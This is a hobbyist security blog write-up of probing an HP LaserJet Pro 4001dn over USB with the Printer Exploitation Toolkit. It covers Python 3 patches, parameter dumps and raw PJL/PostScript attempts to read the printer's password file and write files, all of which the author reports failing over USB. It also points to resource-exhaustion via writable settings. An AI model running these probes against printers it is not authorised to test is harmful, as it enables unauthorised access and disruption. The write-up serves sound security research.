---
layout: post
title: "Poking Around On An Hp Laserjet 4001Dn"
date: 2026-09-30 12:00:00 -0000
categories: ctf writeups
---

# introduction

it's been a while since i've made a blog post. been super busy studying and passing GXPN, working on HackTheBox Academy lessons, competing in a couple CtF's, and working my new job (just completed my first year of professional cybersec work hooray!). recently, i was trying to hack an HP LaserJet Pro 4001dn, which is vulnerable to CVE-2025-26506/7/8 if old firmware is installed, but specifically trying to fuzz CVE-2025-26506 to get the printer to crash, and then, once the buffer size is confirmed, attempt some shellcode. Unfortunately, i was unsuccessful. Just as a side-project, i further experimented with PRET (Printer Exploitation Toolkit) against the HP printer. it's currently coded to python2, but i forked the repo and updated a few of the main python files to python3 syntax for easier use. below is a write up of some of my work with PRET and just poking around & seeing what i could do.

# Poking an HP LaserJet Pro 4001dn Over USB with PRET

A walkthrough of using the Printer Exploitation Toolkit (PRET) against an HP LaserJet Pro 4001dn over a direct USB connection...no network required.

---

## Setup

### Getting PRET

```bash
git clone https://github.com/rundas-r00t/PRET
cd pret
```

PRET targets Python 2. Running it under Python 3.x requires patching several compatibility issues (see below).

### USB Device Access

The printer appears as `/dev/usb/lp0`. By default it's owned by `root:lp` with mode `660`, so you'll need to either add yourself to the `lp` group or chmod it:

```bash
# Permanent fix: add yourself to the lp group --this is what i ended up doing. it just made things easier in the long-run
sudo usermod -aG lp $USER
newgrp lp   # apply in current session without logout

# Or one-shot:
sudo chmod a+rw /dev/usb/lp0
```

To make the permission survive reboots/replugs via udev:

```bash
# Get your printer's vendor:product ID
lsusb | grep -i hp
# e.g. Bus 003 Device 006: ID 03f0:0274 HP, Inc HP LaserJet Pro 4001

sudo tee /etc/udev/rules.d/99-hp-printer.rules << 'EOF'
SUBSYSTEM=="usb", ATTRS{idVendor}=="03f0", ATTRS{idProduct}=="0274", MODE="0666"
EOF
sudo udevadm control --reload-rules
sudo udevadm trigger
# Unplug and replug the USB cable
```

---

## Python 3 Compatibility Patches

PRET 0.40 was written for Python 2. These fixes are required before it will work under Python 3. If you cloned my repo (linked above) these should already be good to go, so you can skip this part. if you cloned the main repo from RUB-NDS, you'll need to apply these changes.

### helper.py: USB write requires bytes

The USB write path passes a `str` to `os.write()`, which requires `bytes` in Python 3.

Find the line in `class conn` that calls `os.write(self._file, data)` and add a guard before it:

```python
if not isinstance(data, bytes):
    data = data.encode()
return os.write(self._file, data)
```

### helper.py: decode binary responses safely

The USB read path calls `.decode()` with no error handling. Printers return binary data that breaks UTF-8 decoding:

```python
# Before
return os.read(self._file, bytes).decode()

# After
return os.read(self._file, bytes).decode('latin-1')
```

### Invalid regex escape sequences

Python 3.12+ turns invalid escape sequences into `SyntaxWarning`; Python 3.14 causes some of the escape sequences to be fatal errors. Prefix all regex strings with `r""`:

```python
# helper.py
PS_CATCH = r'%%\[ (.*)\]%%'
PS_ERROR = r'%%\[ Error: (.*)\]%%'
PS_FLUSH = r'%%\[ Flushing: (.*)\]%%'

# postscript.py, pjl.py, printer.py, pcl.py
# Change any re.split("\s+", ...) → re.split(r"\s+", ...)
# Change any re.findall("\d+", ...) → re.findall(r"\d+", ...)
# etc.
```

### postscript.py: bytes iteration

Python 3 iterates `bytes` as ints, not chars. In the `put` command's byte-processing loop:

```python
# Add before the list comprehension that uses ord():
if isinstance(data, bytes):
    data = data.decode('latin-1')
```

### pret.py: ASCII art escape

```python
# Line 55: change \| to \\|
print("  |-||\\/_____\\||-.  | |´ ...")
```

After patching, verify with:

```bash
python3 -m py_compile pret.py helper.py postscript.py printer.py pjl.py pcl.py
# Should return no output
```

---

## Connecting

```bash
python3 pret.py /dev/usb/lp0 ps    # PostScript mode
python3 pret.py /dev/usb/lp0 pjl   # PJL mode
```

Successful connection:

```
Connection to /dev/usb/lp0 established
Device:   HP LaserJet Pro 4001
```

---

## PJL Enumeration

### Device info

```
/dev/usb/lp0:/> info id
/dev/usb/lp0:/> info status
/dev/usb/lp0:/> info variables
```

### Filesystem info

```
/dev/usb/lp0:/> info filesys
```

Returns volume info including a READ-WRITE DIMM (~47 MB):

```
[0]
  NAME=0:\
  LABEL=DIMM
  TYPE=VOLUME
  SIZE=47185920
  FREESPACE=45875200
  LOCATION=INTERNAL
  ACCESS=READ-WRITE
```

### Directory listing

```
/dev/usb/lp0:/> ls
/dev/usb/lp0:/> ls 0:\
```

On this printer, `ls` and directory operations returned no data over USB. PJL filesystem operations (FSDIRLIST, FSQUERY, FSUPLOAD, FSDOWNLOAD) appear to be routed through the network interface only: they accept commands but return empty responses over USB.

---

## PostScript Enumeration

PRET's `dump` command sends a custom PS payload that introspects PS dictionaries and returns JSON-formatted results.

> **Note:** Large dictionaries like `systemdict` and `statusdict` often time out mid-transfer over USB: the USB bulk transfer splits the response and PRET's JSON parser fails. Target smaller dicts first.

### System parameters

```
/dev/usb/lp0:/> dump currentsystemparams
```

```
├─ rw-  integer      BuildTime                       1660195497
├─ rw-  boolean      ByteOrder                       true
├─ rw-  string       ControllerSerialNumber          ()
├─ rw-  integer      CurDisplayList                  10000
├─ rw-  string       CurInputDevice                  %HybridComm%
├─ rw-  string       CurOutputDevice                 %HybridComm%
├─ rw-  boolean      DoPrintErrors                   false
├─ rw-  boolean      DoStartPage                     true
├─ rw-  string       EngineSWVersion                 ????
├─ rw-  boolean      FactoryDefaults                 false
├─ rw-  integer      JobTimeout                      0
├─ rw-  string       LicenseID                       ##-###-###
├─ rw-  integer      MaxFontCache                    8726910
├─ rw-  string       PrinterName                     
├─ rw-  integer      RamSize                         64982000
├─ rw-  string       RealFormat                      IEEE
├─ rw-  integer      StartupMode                     1
├─ rw-  boolean      ValidNV                         true
└─ rw-  integer      WaitTimeout                     300
```

Every parameter shows `rw-`: readable and writable with **no authentication**.

Notable values:
- `BuildTime: 1660195497` → firmware built **2022-08-11**
- `JobTimeout: 0` → no job timeout enforced
- `EngineSWVersion: ????` → obfuscated by the printer
- `PrinterName: (empty)` → writable, currently unset

### User parameters

```
/dev/usb/lp0:/> dump currentuserparams
```

```
├─ rw-  integer      JobTimeout                      0
├─ rw-  integer      MaxDictStack                    530
├─ rw-  integer      MaxExecStack                    10015
├─ rw-  integer      MaxLocalVM                      2147483647
├─ rw-  integer      MaxOpStack                      130000
├─ rw-  integer      VMReclaim                       0
├─ rw-  integer      VMThreshold                     647935
└─ rw-  integer      WaitTimeout                     300
```

`MaxLocalVM: 2147483647` (2³¹−1) means PS VM memory is effectively unlimited. Combined with `VMReclaim: 0` (GC disabled) and `JobTimeout: 0`, a crafted PS job can exhaust device memory: all writable without auth.

### Page device parameters

```
/dev/usb/lp0:/> dump currentpagedevice
```

```
├─ rw-  boolean      Collate                         false
├─ rw-  boolean      Duplex                          false
├─ rw-  boolean      ManualFeed                      false
├─ rw-  integer      ManualFeedTimeout               60
├─ rw-  name         ProcessColorModel               DeviceGray
├─ rw-  boolean      OutputFaceUp                    false
├─ rw-  boolean      PrintOnBackside                 false
├─ rw-  integer      PixelDepth                      8
└─ rw-  boolean      UseCIEColor                     false
```

### statusdict (partial: truncated by USB)

```
/dev/usb/lp0:/> dump statusdict
```

Despite truncation, the partial response reveals several operators with `rwx` permissions (executable, no auth):

```
├─ r--  string       product                         HP LaserJet Pro 4001
├─ rwx  operator     checkpassword
├─ rwx  operator     printer_reset
├─ rwx  operator     setprintername
├─ rwx  operator     setjobtimeout
├─ rwx  operator     dostartpage
├─ rw-  boolean      eerom                           true
└─ rw-  name         defaultfont                     Courier
```

`printer_reset`, `setprintername`, and `checkpassword` are all callable without authentication.

---

## Attempting Filesystem Access

### PS file write (blocked by sandbox)

```
/dev/usb/lp0:/> put /tmp/pret-test.txt
PostScript Error (invalidfileaccess; OffendingCommand: file)
Permission denied.
```

The PS interpreter's sandbox blocks the `file` operator for write access. This is good from a defensive perspective, but overall quite frustrating for me, as I could not figure out how to escape this sandbox and gain write permissions.

### Raw PJL over USB (read mechanism)

PRET's underlying USB read uses a blocking `os.read()` in a thread. Using `select()` directly on `/dev/usb/lp0` does **not** work: the `usblp` kernel driver doesn't signal readability through `select`. We need a threading approach. Therefore, let's switch to python:

```python
import os, time, threading

def pjl_query(device, cmd):
    buf = b''
    stop = threading.Event()

    def reader():
        nonlocal buf
        while not stop.is_set():
            try:
                chunk = os.read(fd, 512)
                if chunk:
                    buf += chunk
            except OSError:
                break

    fd = os.open(device, os.O_RDWR)
    t = threading.Thread(target=reader, daemon=True)
    t.start()
    os.write(fd, b'\x1b%-12345X@PJL\r\n' + cmd + b'\r\n\x1b%-12345X')
    time.sleep(4)
    stop.set()
    t.join(timeout=2)
    os.close(fd)
    return buf
```

Verify PJL is alive with an echo:

```python
result = pjl_query('/dev/usb/lp0', b'@PJL ECHO ALIVE')
print(result)
# b'@PJL ECHO ALIVE\r\n\x0c'
```

### PJL filesystem operations (all return empty over USB)

```python
# Directory listing
pjl_query('/dev/usb/lp0', b'@PJL FSDIRLIST NAME="0:\\" ENTRY=1 COUNT=99')
# b''

# Read a file
pjl_query('/dev/usb/lp0', b'@PJL FSUPLOAD FORMAT:BINARY NAME="0:\\pjlpasswd"')
# b''

# Write a file
content = b'test\n'
cmd = b'@PJL FSDOWNLOAD FORMAT:BINARY SIZE=' + str(len(content)).encode() + b' NAME="0:\\test.txt"\r\n' + content
pjl_query('/dev/usb/lp0', cmd)
# b''
```

### PS filenameforall (no filesystem visibility)

```python
import os, time, threading

fd = os.open('/dev/usb/lp0', os.O_RDWR)
# (use same thread reader as above)

ps = b"""%!PS
(0:\\*.*) {
    dup print (\\n) print
} 255 string filenameforall
flush
"""
# Result: b''
```

### Conclusion on filesystem access

All USB-side filesystem vectors were exhausted:

| Method | Result |
|--------|--------|
| PJL FSDIRLIST | No response |
| PJL FSQUERY | No response |
| PJL FSUPLOAD (read) | No response |
| PJL FSDOWNLOAD (write) | No response |
| PS `file` operator (write) | `invalidfileaccess` |
| PS `filenameforall` | No response |
| PJL ECHO | ✅ Works |

PJL communication works fine over USB for status queries. The printer appears to route all PJL filesystem I/O exclusively through its network interface (TCP/9100). USB gets basic PJL and the full PostScript interpreter, but no filesystem operations return data regardless of approach.

---

## Key Takeaways

1. **The PS interpreter is fully accessible over USB with zero authentication.** Any user who can write to `/dev/usb/lp0` can enumerate all device parameters and call privileged operators.

2. **Every system parameter is writable without auth.** `currentsystemparams`, `currentuserparams`, and most of `currentpagedevice` all show `rw-`. This means JobTimeout, VM limits, printer name, print behavior: all changeable.

3. **Destructive operators are callable without auth.** `printer_reset`, `setprintername`, and `checkpassword` in `statusdict` are all `rwx` with no access control.

4. **Filesystem access requires network scope.** DIMM is READ-WRITE but unreachable over USB. If you have TCP/9100 access, that's a separate: and likely more fruitful: story.

5. **`select()` doesn't work on `/dev/usb/lp0`.** Use a background thread blocking on `os.read()` for any raw USB I/O with the `usblp` driver.
